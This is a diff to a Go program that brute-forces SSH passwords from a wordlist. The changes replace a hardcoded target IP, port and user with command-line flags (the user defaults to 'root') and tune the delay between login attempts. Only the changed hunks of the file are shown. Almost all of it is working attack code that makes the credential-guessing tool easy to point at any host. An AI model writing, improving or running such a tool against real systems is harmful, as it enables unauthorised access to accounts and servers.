@@ -1,14 +1,14 @@
 /*
 golang example to find a password for a ssh user
 using a large wordlist file.
-TODO: add args to set ipaddr, user(s), password file, adjust wait time for
-connection and check time taken running, check if the ip is down, create a
-results file.
+TODO: add args to adjust wait time for connection, check if the ip is down,
+create a results file.
 */
 package main
 
 import (
 	"bufio"
+	"flag"
 	"fmt"
 	"os"
 	"strconv"
@@ -17,15 +17,13 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-var inittime = time.Now()
-
-var ipaddr string = "192.168.125.100"
-
-var port int = 22
-
-var user string = "test"
-
-var passwordfile string = "passwords.txt"
+var (
+	inittime     = time.Now()
+	passwordfile = flag.String("file", "wordlistfile.txt", "indicate wordlist file to use")
+	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to brute force")
+	port         = flag.Int("port", 22, "indicate port to brute force")
+	user         = flag.String("user", "root", "indicate user to brute force")
+)
 
 // Define fileScanner with methods
 type fileScanner struct {
@@ -67,14 +65,14 @@ func NewDialer() *Dialer {
 func sshdialer(password string, ch chan Dialer) {
 	salida := NewDialer()
 	config := &ssh.ClientConfig{
-		User: user,
+		User: *user,
 		Auth: []ssh.AuthMethod{
 			ssh.Password(password),
 		},
 		Timeout: 150 * time.Millisecond,
 	}
 	//Create dial
-	_, err := ssh.Dial("tcp", ipaddr+":"+strconv.Itoa(port), config)
+	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
 	if err != nil {
 		fmt.Printf("Failed: %s ---", password)
 	} else {
@@ -91,9 +89,10 @@ func sshdialer(password string, ch chan Dialer) {
 var found bool
 
 func main() {
+	flag.Parse()
 	ch := make(chan Dialer)
 	fscanner := NewFileScanner()
-	err := fscanner.Open(passwordfile)
+	err := fscanner.Open(*passwordfile)
 	if err != nil {
 		fmt.Println("error in open file step: ", err.Error())
 	} else {
@@ -104,7 +103,7 @@ func main() {
 			// Don´t set this time lower, you need to have a proper time to get a response
 			// the response time depends in several factors, it may work with 120 Milliseconds
 			// but sometimes bypass the correct password.
-			time.Sleep(180 * time.Millisecond)
+			time.Sleep(200 * time.Millisecond)
 			go func() {
 				for x := range ch {
 					if x.err != nil {
